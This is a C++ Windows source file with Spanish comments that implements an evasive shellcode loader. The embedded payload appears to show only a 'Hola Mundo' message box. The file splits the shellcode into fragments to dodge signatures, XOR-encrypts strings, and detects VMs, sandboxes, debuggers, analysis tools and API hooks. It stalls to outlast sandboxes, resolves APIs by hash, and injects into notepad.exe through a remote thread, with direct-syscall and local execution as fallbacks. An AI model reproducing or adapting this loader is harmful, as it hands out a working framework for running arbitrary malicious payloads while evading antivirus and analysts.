#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <cstring>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wbemidl.h>
#include <oleauto.h>
#include <comdef.h>
#include <setupapi.h>
#include <devguid.h>
#include <cfgmgr32.h>
#include <array>

constexpr std::array<unsigned char, 16> encryptionKeyTC = {
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11, 0x22,
    0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99
};

constexpr auto encrypt_string(const char* str, size_t len){
    std::array<unsigned char, 256> encrypted{};
    for (size_t i = 0; i < len && i < encrypted.size(); ++i){
        encrypted[i] = static_cast<unsigned char>(str[i]) ^ encryptionKeyTC[i % encryptionKeyTC.size()];
    }
    return encrypted;
}

template <size_t N>
class EncryptedString {
private:
    const std::array<unsigned char, N> encrypted_data;
    
public:
    constexpr EncryptedString(const std::array<unsigned char, N>& data) 
        : encrypted_data(data) {}
    
    const char* decrypt() const {
        static thread_local char buffer[N + 1];
        for (size_t i = 0; i < N; ++i) {
            buffer[i] = encrypted_data[i] ^ encryptionKeyTC[i % encryptionKeyTC.size()];
        }
        buffer[N] = '\0';
        return buffer;
    }
    
    operator const char*() const {
        return decrypt();
    }
};

#define ENC_STR(str) []() { \
    constexpr auto encrypted = encrypt_string(str, sizeof(str) - 1); \
    constexpr EncryptedString<encrypted.size()> es(encrypted); \
    return es; \
}()

// Shellcode en claro (dividido en múltiples partes para evadir firmas)
unsigned char part1[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41 };
unsigned char part2[] = { 0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60 };
unsigned char part3[] = { 0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f };
unsigned char part4[] = { 0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02 };
unsigned char part5[] = { 0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b };
unsigned char part6[] = { 0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02 };
unsigned char part7[] = { 0x41,0x51,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00 };
unsigned char part8[] = { 0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b };
unsigned char part9[] = { 0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88 };
unsigned char part10[] = { 0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d };
unsigned char part11[] = { 0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39 };
unsigned char part12[] = { 0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b };
unsigned char part13[] = { 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48 };
unsigned char part14[] = { 0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41 };
unsigned char part15[] = { 0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48 };
unsigned char part16[] = { 0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75 };
unsigned char part17[] = { 0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,0x41,0xba,0x4c };
unsigned char part18[] = { 0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0xe8,0x0b };
unsigned char part19[] = { 0x00,0x00,0x00,0x48,0x6f,0x6c,0x61,0x20,0x4d,0x75,0x6e,0x64,0x6f,0x00 };
unsigned char part20[] = { 0x5a,0xe8,0x07,0x00,0x00,0x00,0x53,0x61,0x6c,0x75,0x64,0x6f,0x00,0x41 };
unsigned char part21[] = { 0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31 };
unsigned char part22[] = { 0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

// Clave para encriptar/desencriptar el shellcode
const unsigned char encryptionKey[] = { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11 };

// Función para encriptar/desencriptar datos usando XOR simple
void XorCrypt(unsigned char* data, size_t size, const unsigned char* key, size_t keySize) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % keySize];
    }
}

// Función para verificar si se está ejecutando en una máquina virtual
bool IsRunningInVM() {
    SYSTEM_INFO si = { 0 };
    GetSystemInfo(&si);
    
    // Verificar número de procesadores
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }
    
    // Verificar cantidad de RAM
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        if (memStatus.ullTotalPhys < 2147483648ULL) { // 2GB
            return true;
        }
    }
    
    // Verificar dispositivos virtuales comunes
    HDEVINFO hDevInfo = SetupDiGetClassDevsA(NULL, "PCI", NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        SP_DEVINFO_DATA deviceInfoData;
        deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
        
        for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &deviceInfoData); i++) {
            char buffer[4096];
            if (SetupDiGetDeviceRegistryPropertyA(hDevInfo, &deviceInfoData, SPDRP_HARDWAREID, NULL, 
                                                (PBYTE)buffer, sizeof(buffer), NULL)) {
                // Usar cadenas cifradas
                if (strstr(buffer, ENC_STR("VBOX")) || 
                    strstr(buffer, ENC_STR("VMWARE")) || 
                    strstr(buffer, ENC_STR("VIRTUAL")) || 
                    strstr(buffer, ENC_STR("QEMU")) || 
                    strstr(buffer, ENC_STR("XEN")) || 
                    strstr(buffer, ENC_STR("BOCHS"))) {
                    SetupDiDestroyDeviceInfoList(hDevInfo);
                    return true;
                }
            }
        }
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }
    
    return false;
}

// Función para verificar si se está ejecutando en un sandbox
bool IsRunningInSandbox() {
    // Verificar tiempo de actividad del sistema
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // Menos de 10 minutos
        return true;
    }
    
    // Verificar procesos relacionados con análisis
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snapshot, &pe32)) {
            do {
                // Usar cadenas cifradas para comparación
                if (_stricmp(pe32.szExeFile, ENC_STR("vmsrvc.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmusrvc.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmtoolsd.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmwaretray.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmwareuser.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vboxservice.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vboxtray.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("procexp.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("procexp64.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("wireshark.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("fiddler.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("httpdebuggerui.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("processhacker.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("sysinternals.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("dumpcap.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("idag.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("idaq.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("idaq64.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("ollydbg.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("x64dbg.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("windbg.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("joeboxserver.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("joeboxcontrol.exe")) == 0) {
                    CloseHandle(snapshot);
                    return true;
                }
            } while (Process32Next(snapshot, &pe32));
        }
        CloseHandle(snapshot);
    }
    
    // Verificar archivos comunes en sandboxes
    if (GetFileAttributesA(ENC_STR("C:\\tools\\")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\analysis\\")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\sample.exe")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\malware.exe")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\virus.exe")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\sandbox\\")) != INVALID_FILE_ATTRIBUTES) {
        return true;
    }
    
    return false;
}

// Función para verificar si hay un depurador adjunto
bool IsDebuggerPresentCustom() {
    return ::IsDebuggerPresent() != FALSE;
}

// Función para verificar si hay un depurador mediante el bloqueo de memoria
bool CheckRemoteDebuggerPresent() {
    HANDLE hProcess = GetCurrentProcess();
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &debuggerPresent);
    return debuggerPresent != FALSE;
}

// Función para detectar hooks de API
bool DetectAPIHooks() {
    // Verificar si hay hooks en funciones críticas
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll) {
        FARPROC pNtAllocateVirtualMemory = GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
        if (pNtAllocateVirtualMemory) {
            BYTE* pBytes = (BYTE*)pNtAllocateVirtualMemory;
            
            // Los primeros bytes de NtAllocateVirtualMemory deberían ser:
            // mov r10, rcx (4C 8B D1)
            // mov eax, syscallNumber (B8 XX XX XX XX)
            if (pBytes[0] != 0x4C || pBytes[1] != 0x8B || pBytes[2] != 0xD1) {
                return true; // Hook detectado
            }
        }
    }
    
    return false;
}

// Función para retrasar la ejecución con técnicas anti-sandbox
void AntiSandboxDelay() {
    // Retraso aleatorio entre 30-60 segundos
    DWORD delay = 30000 + (rand() % 30000);
    
    // Usar diferentes métodos de espera para evadir detección
    LARGE_INTEGER frequency, startTime, endTime;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);
    
    do {
        // Mezclar diferentes métodos de espera
        Sleep(100);
        
        // Operaciones inútiles para consumir tiempo
        volatile int junk = 0;
        for (int i = 0; i < 1000; i++) {
            junk += i;
        }
        
        // Verificar tiempo transcurrido
        QueryPerformanceCounter(&endTime);
        LONGLONG elapsed = (endTime.QuadPart - startTime.QuadPart) * 1000 / frequency.QuadPart;
        
        // Si el tiempo transcurrido es mayor que el retraso deseado, salir
        if (elapsed >= delay) {
            break;
        }
        
        // Verificar periódicamente si estamos en un sandbox
        if (IsRunningInSandbox() || IsRunningInVM()) {
            // Si detectamos sandbox, aumentar el retraso
            delay += 60000; // Añadir 60 segundos más
        }
        
    } while (true);
}

// Calcular el tamaño total del shellcode sumando todas las partes
const DWORD CalculateShellcodeSize() {
    return sizeof(part1) + sizeof(part2) + sizeof(part3) + sizeof(part4) + 
           sizeof(part5) + sizeof(part6) + sizeof(part7) + sizeof(part8) + 
           sizeof(part9) + sizeof(part10) + sizeof(part11) + sizeof(part12) + 
           sizeof(part13) + sizeof(part14) + sizeof(part15) + sizeof(part16) + 
           sizeof(part17) + sizeof(part18) + sizeof(part19) + sizeof(part20) + 
           sizeof(part21) + sizeof(part22);
}

// Función para combinar partes del shellcode
void CombineShellcode(unsigned char* output) {
    size_t offset = 0;
    
    memcpy(output + offset, part1, sizeof(part1));
    offset += sizeof(part1);
    
    memcpy(output + offset, part2, sizeof(part2));
    offset += sizeof(part2);
    
    memcpy(output + offset, part3, sizeof(part3));
    offset += sizeof(part3);
    
    memcpy(output + offset, part4, sizeof(part4));
    offset += sizeof(part4);
    
    memcpy(output + offset, part5, sizeof(part5));
    offset += sizeof(part5);
    
    memcpy(output + offset, part6, sizeof(part6));
    offset += sizeof(part6);
    
    memcpy(output + offset, part7, sizeof(part7));
    offset += sizeof(part7);
    
    memcpy(output + offset, part8, sizeof(part8));
    offset += sizeof(part8);
    
    memcpy(output + offset, part9, sizeof(part9));
    offset += sizeof(part9);
    
    memcpy(output + offset, part10, sizeof(part10));
    offset += sizeof(part10);
    
    memcpy(output + offset, part11, sizeof(part11));
    offset += sizeof(part11);
    
    memcpy(output + offset, part12, sizeof(part12));
    offset += sizeof(part12);
    
    memcpy(output + offset, part13, sizeof(part13));
    offset += sizeof(part13);
    
    memcpy(output + offset, part14, sizeof(part14));
    offset += sizeof(part14);
    
    memcpy(output + offset, part15, sizeof(part15));
    offset += sizeof(part15);
    
    memcpy(output + offset, part16, sizeof(part16));
    offset += sizeof(part16);
    
    memcpy(output + offset, part17, sizeof(part17));
    offset += sizeof(part17);
    
    memcpy(output + offset, part18, sizeof(part18));
    offset += sizeof(part18);
    
    memcpy(output + offset, part19, sizeof(part19));
    offset += sizeof(part19);
    
    memcpy(output + offset, part20, sizeof(part20));
    offset += sizeof(part20);
    
    memcpy(output + offset, part21, sizeof(part21));
    offset += sizeof(part21);
    
    memcpy(output + offset, part22, sizeof(part22));
    offset += sizeof(part22);
}

// Obtener dirección de función usando hashing en lugar de nombres
FARPROC GetProcAddressByHash(HMODULE module, DWORD functionHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)module + dosHeader->e_lfanew);
    
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)module + exportDirRva);
    
    PDWORD functionsRva = (PDWORD)((DWORD_PTR)module + exportDir->AddressOfFunctions);
    PDWORD namesRva = (PDWORD)((DWORD_PTR)module + exportDir->AddressOfNames);
    PWORD ordinals = (PWORD)((DWORD_PTR)module + exportDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR functionName = (LPCSTR)((DWORD_PTR)module + namesRva[i]);
        
        // Calcular hash del nombre de la función
        DWORD hash = 0;
        for (int j = 0; functionName[j]; j++) {
            hash = (hash * 0x1003f) + functionName[j];
        }
        
        if (hash == functionHash) {
            DWORD functionRva = functionsRva[ordinals[i]];
            return (FARPROC)((DWORD_PTR)module + functionRva);
        }
    }
    return NULL;
}

// Syscall stub dinámico
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAddress, 
                       ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    // Construir syscall stub dinámico
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscallNumber
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Insertar número de syscall
    *(DWORD*)(syscallStub + 5) = syscallNumber;
    
    // Ejecutar stub
    NTSTATUS result;
    void* execMem = VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        return GetLastError();
    }
    
    memcpy(execMem, syscallStub, sizeof(syscallStub));
    
    typedef NTSTATUS(*SyscallFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    SyscallFunc syscallFunc = (SyscallFunc)execMem;
    result = syscallFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    
    VirtualFree(execMem, 0, MEM_RELEASE);
    return result;
}

// Función para inyectar en un proceso legítimo con manejo de permisos
bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
    // Lista de procesos objetivo ordenados por prioridad (menos a más sospechosos)
    const char* targetProcesses[] = {
        "notepad.exe" 
    };
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
        return false;
    }
    
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(processEntry);
    
    bool injectionSuccess = false;
    
    if (Process32First(snapshot, &processEntry)) {
        do {
            for (const char* target : targetProcesses) {
                if (_stricmp(processEntry.szExeFile, target) == 0) {
                    std::cout << "Proceso encontrado: " << processEntry.szExeFile << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
                    
                    // Intentar abrir el proceso con permisos adecuados
                    HANDLE process = NULL;
                    
                    // Primero intentar con permisos básicos
                    process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, processEntry.th32ProcessID);
                    
                    // Si falla, intentar con permisos más amplios (requiere admin)
                    if (!process) {
                        process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
                    }
                    
                    if (!process) {
                        DWORD error = GetLastError();
                        std::cerr << "OpenProcess failed for " << processEntry.szExeFile << ": " << error << std::endl;
                        continue;
                    }
                    
                    std::cout << "Proceso abierto exitosamente" << std::endl;
                    
                    // Desencriptar el shellcode antes de inyectarlo
                    unsigned char* decryptedShellcode = new unsigned char[size];
                    memcpy(decryptedShellcode, shellcode, size);
                    XorCrypt(decryptedShellcode, size, encryptionKey, sizeof(encryptionKey));
                    
                    // Asignar memoria en el proceso remoto
                    LPVOID remoteMem = VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (!remoteMem) {
                        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
                        delete[] decryptedShellcode;
                        CloseHandle(process);
                        continue;
                    }
                    
                    std::cout << "Memoria asignada en proceso remoto: " << remoteMem << std::endl;
                    
                    // Escribir shellcode DESENCRIPTADO en el proceso remoto
                    if (!WriteProcessMemory(process, remoteMem, decryptedShellcode, size, NULL)) {
                        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
                        VirtualFreeEx(process, remoteMem, 0, MEM_RELEASE);
                        delete[] decryptedShellcode;
                        CloseHandle(process);
                        continue;
                    }
                    
                    std::cout << "Shellcode escrito en proceso remoto" << std::endl;
                    
                    // Crear hilo remoto
                    HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
                    if (!thread) {
                        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
                        VirtualFreeEx(process, remoteMem, 0, MEM_RELEASE);
                        delete[] decryptedShellcode;
                        CloseHandle(process);
                        continue;
                    }
                    
                    std::cout << "Hilo remoto creado exitosamente" << std::endl;
                    
                    // Esperar a que el hilo termine (aumentar el tiempo de espera)
                    WaitForSingleObject(thread, 15000); // Esperar 15 segundos
                    
                    // Obtener el código de salida del hilo
                    DWORD exitCode;
                    if (GetExitCodeThread(thread, &exitCode)) {
                        std::cout << "El hilo remoto terminó con código: " << exitCode << std::endl;
                    }
                    
                    // NO liberar la memoria remota aquí, ya que podría ser necesaria
                    // para el funcionamiento del shellcode después de que el hilo termine
                    // Solo cerrar el handle del hilo
                    CloseHandle(thread);
                    CloseHandle(process);
                    
                    // Liberar memoria temporal del shellcode desencriptado
                    delete[] decryptedShellcode;
                    
                    injectionSuccess = true;
                    break;
                }
            }
            
            if (injectionSuccess) {
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    } else {
        std::cerr << "Process32First failed: " << GetLastError() << std::endl;
    }
    
    CloseHandle(snapshot);
    return injectionSuccess;
}

// Función para imprimir bytes en hexadecimal
void PrintHex(const unsigned char* data, size_t size, const char* label) {
    std::cout << label << ": ";
    for (size_t i = 0; i < (size > 16 ? 16 : size); i++) {
        printf("%02x ", data[i]);
    }
    std::cout << std::endl;
}

// Función principal
int main() {
    // Inicializar semilla para números aleatorios
    srand(GetTickCount());
    
    // Verificar si estamos en un entorno de análisis
    //if (IsRunningInVM() || IsRunningInSandbox() || IsDebuggerPresentCustom() || CheckRemoteDebuggerPresent() || DetectAPIHooks()) {
        // Si estamos en un entorno de análisis, salir silenciosamente
        // O ejecutar código benigno para evadir detección
      //  std::cout << "Entorno de análisis detectado. Saliendo..." << std::endl;
   //     return 0;
    //}
    
    // Retraso anti-sandbox
    AntiSandboxDelay();
    
    // Calcular el tamaño real del shellcode
    const DWORD shellcodeSize = CalculateShellcodeSize();
    std::cout << "Tamaño calculado del shellcode: " << shellcodeSize << " bytes" << std::endl;
    
    std::cout << "Combinando partes" << std::endl;
    // Combinar partes del shellcode
    unsigned char* combinedShellcode = new unsigned char[shellcodeSize];
    CombineShellcode(combinedShellcode);
    
    // Imprimir primeros bytes del shellcode combinado para verificar (sin encriptar)
    std::cout << "Primeros bytes del shellcode combinado (sin encriptar): ";
    for (int i = 0; i < 20 && i < shellcodeSize; i++) {
        printf("%02x ", combinedShellcode[i]);
    }
    std::cout << std::endl;
    
    // Encriptar el shellcode combinado
    XorCrypt(combinedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
    
    // Imprimir primeros bytes del shellcode encriptado para verificar
    std::cout << "Primeros bytes del shellcode encriptado: ";
    for (int i = 0; i < 20 && i < shellcodeSize; i++) {
        printf("%02x ", combinedShellcode[i]);
    }
    std::cout << std::endl;
    
    std::cout << "Inyectando shellcode" << std::endl;
    // Técnica de inyección de proceso
    if (InjectIntoProcess(combinedShellcode, shellcodeSize)) {
        std::cout << "Inyección completada" << std::endl;
        delete[] combinedShellcode;
        return 0;
    }
    
    std::cout << "Si fallo la inyeccion ejecutamos con memoria local" << std::endl;
    // Si falla la inyección, usar técnica de memoria local
    SIZE_T size = shellcodeSize;
    LPVOID memory = NULL;
    
    std::cout << "Asignando memoria con syscall" << std::endl;
    // Asignar memoria usando syscall indirecta
    NTSTATUS status = DynamicSyscall(0x18, GetCurrentProcess(), &memory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (status != 0) {
        std::cerr << "DynamicSyscall failed: 0x" << std::hex << status << std::dec << std::endl;
        // Fallback a VirtualAlloc si falla la syscall
        memory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!memory) {
            std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
            delete[] combinedShellcode;
            return 1;
        }
    }
    
    std::cout << "Memoria asignada en: " << memory << std::endl;
    std::cout << "Copiando shellcode" << std::endl;
    
    // Copiar shellcode encriptado
    memcpy(memory, combinedShellcode, size);
    
    // Desencriptar el shellcode en memoria
    XorCrypt((unsigned char*)memory, size, encryptionKey, sizeof(encryptionKey));
    
    std::cout << "Cambiando los permisos" << std::endl;
    // Cambiar permisos a ejecución
    DWORD oldProtect;
    if (!VirtualProtect(memory, size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "VirtualProtect failed: " << GetLastError() << std::endl;
        delete[] combinedShellcode;
        return 1;
    }
    
    std::cout << "Ejecutando el shellcode" << std::endl;
    
    // Ejecutar shellcode con manejo de excepciones
    ((void(*)())memory)();
    
    std::cout << "Shellcode ejecutado correctamente" << std::endl;
    
    delete[] combinedShellcode;
    return 0;
}